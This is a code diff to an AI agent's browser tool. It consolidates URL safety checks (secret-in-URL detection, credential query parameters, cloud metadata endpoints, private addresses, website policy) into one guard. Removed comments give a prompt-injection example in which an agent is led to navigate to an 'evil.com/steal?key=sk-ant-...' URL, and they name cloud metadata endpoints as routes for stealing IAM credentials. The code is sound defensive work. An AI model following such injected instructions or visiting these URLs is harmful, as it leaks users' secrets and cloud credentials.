@@ -3273,8 +3273,16 @@ def _redact_browser_output(value: Any) -> Any:
 # Browser Tool Functions
 # ============================================================================
 
-def evaluate_url_safety(url: str) -> Optional[dict]:
-    """Run URL safety checks; None if safe, else an error dict"""
+def evaluate_url_safety(url: str, task_id: Optional[str] = None) -> Optional[dict]:
+    """ADR-0094: the single URL-intake guard; None if safe, else an error dict.
+
+    Runs the five checks (secret exfil, sensitive query params, cloud-metadata
+    floor, private addresses, website policy) plus the hybrid-routing sidecar
+    exemption: a private URL navigated through the auto-local sidecar never
+    reaches the cloud provider, so the sensitive-param and private-address
+    checks do not fire for it. ``task_id`` feeds the navigation session key
+    (None-safe — treated as the default session).
+    """
     import urllib.parse
     from agent.redact import _PREFIX_RE
 
@@ -3286,8 +3294,9 @@ def evaluate_url_safety(url: str) -> Optional[dict]:
         return _secret
 
     local = _is_local_backend()
+    auto_local_this_nav = _is_local_sidecar_key(_navigation_session_key(task_id, url))
     sensitive_query_key = _sensitive_query_param_name(url)
-    if sensitive_query_key and not local:
+    if sensitive_query_key and not local and not auto_local_this_nav:
         return {"success": False, "error": (
             "Blocked: URL contains a credential-like query parameter "
             f"({sensitive_query_key}). Cloud browser backends are third-party "
@@ -3295,7 +3304,12 @@ def evaluate_url_safety(url: str) -> Optional[dict]:
             "query parameter before navigating.")}
     if _is_always_blocked_url(url):
         return {"success": False, "error": "Blocked: URL targets a cloud metadata endpoint"}
-    if not local and not _allow_private_urls() and not _is_safe_url(url):
+    if (
+        not local
+        and not auto_local_this_nav
+        and not _allow_private_urls()
+        and not _is_safe_url(url)
+    ):
         return {"success": False, "error": "Blocked: URL targets a private or internal address"}
     blocked = check_website_access(url)
     if blocked:
@@ -3315,87 +3329,18 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     Returns:
         JSON string with navigation result (includes stealth features info on first nav)
     """
-    # Secret exfiltration protection — block URLs that embed API keys or
-    # tokens in query parameters. A prompt injection could trick the agent
-    # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
-    # Also check URL-decoded form to catch %2D encoding tricks (e.g. sk%2Dant%2D...).
-    import urllib.parse
-    from agent.redact import _PREFIX_RE
-    url_decoded = urllib.parse.unquote(url)
-    if _PREFIX_RE.search(url) or _PREFIX_RE.search(url_decoded):
-        return json.dumps({
-            "success": False,
-            "error": "Blocked: URL contains what appears to be an API key or token. "
-                     "Secrets must not be sent in URLs.",
-        })
+    # ADR-0094: one URL-intake guard — evaluate_url_safety owns the five
+    # checks plus the hybrid-routing sidecar exemption; navigate keeps only
+    # the normalization it needs downstream.
+    verdict = evaluate_url_safety(url, task_id=task_id)
+    if verdict is not None:
+        return json.dumps(verdict)
     url = _normalize_url_for_request(url)
-    normalized_decoded = urllib.parse.unquote(url)
-    if _PREFIX_RE.search(url) or _PREFIX_RE.search(normalized_decoded):
-        return json.dumps({
-            "success": False,
-            "error": "Blocked: URL contains what appears to be an API key or token. "
-                     "Secrets must not be sent in URLs.",
-        })
-
-    # SSRF protection — block private/internal addresses before navigating.
-    # Skipped for local backends (Camofox, headless Chromium without a cloud
-    # provider) because the agent already has full local network access via
-    # the terminal tool.  Also skipped when hybrid routing will auto-spawn a
-    # local Chromium sidecar for this URL (cloud provider configured +
-    # private URL + ``browser.auto_local_for_private_urls`` enabled) — the
-    # cloud provider never sees the URL in that case.  Can also be opted
-    # out globally via ``browser.allow_private_urls`` in config.
+    # Session routing (ADR-0094: the guard owns the *decision*, navigation
+    # owns the *mechanics* — the key is re-derived here for the backend path).
     effective_task_id = task_id or "default"
     nav_session_key = _navigation_session_key(effective_task_id, url)
     auto_local_this_nav = _is_local_sidecar_key(nav_session_key)
-
-    sensitive_query_key = _sensitive_query_param_name(url)
-    if sensitive_query_key and not _is_local_backend() and not auto_local_this_nav:
-        return json.dumps({
-            "success": False,
-            "error": (
-                "Blocked: URL contains a credential-like query parameter "
-                f"({sensitive_query_key}). Cloud browser backends are third-party "
-                "readers; use a local browser/CDP session or remove the sensitive "
-                "query parameter before navigating."
-            ),
-        })
-
-    # Always-blocked floor: cloud metadata / IMDS endpoints are denied
-    # regardless of backend, hybrid routing, or allow_private_urls.
-    # There's no legitimate agent use case for navigating to
-    # 169.254.169.254 / metadata.google.internal / ECS task metadata
-    # via a browser, and routing those to a local Chromium sidecar
-    # on an EC2/GCP/Azure host exfiltrates IAM credentials (#16234).
-    # The floor is UNCONDITIONAL — it must fire for every backend,
-    # including the pure-local headless Chromium and off-host CDP cases
-    # (a local Chromium on a cloud VM still reaches the host IMDS).
-    if _is_always_blocked_url(url):
-        return json.dumps({
-            "success": False,
-            "error": "Blocked: URL targets a cloud metadata endpoint",
-        })
-
-    if (
-        not _is_local_backend()
-        and not auto_local_this_nav
-        and not _allow_private_urls()
-        and not _is_safe_url(url)
-    ):
-        return json.dumps({
-            "success": False,
-            "error": "Blocked: URL targets a private or internal address",
-        })
-
-    # Website policy check — block before navigating
-    blocked = check_website_access(url)
-    if blocked:
-        return json.dumps({
-            "success": False,
-            "error": blocked["message"],
-            "blocked_by_policy": {"host": blocked["host"], "rule": blocked["rule"], "source": blocked["source"]},
-        })
-
     # Camofox backend — delegate after safety checks pass
     if _is_camofox_mode():
         from tools.browser_camofox import camofox_navigate
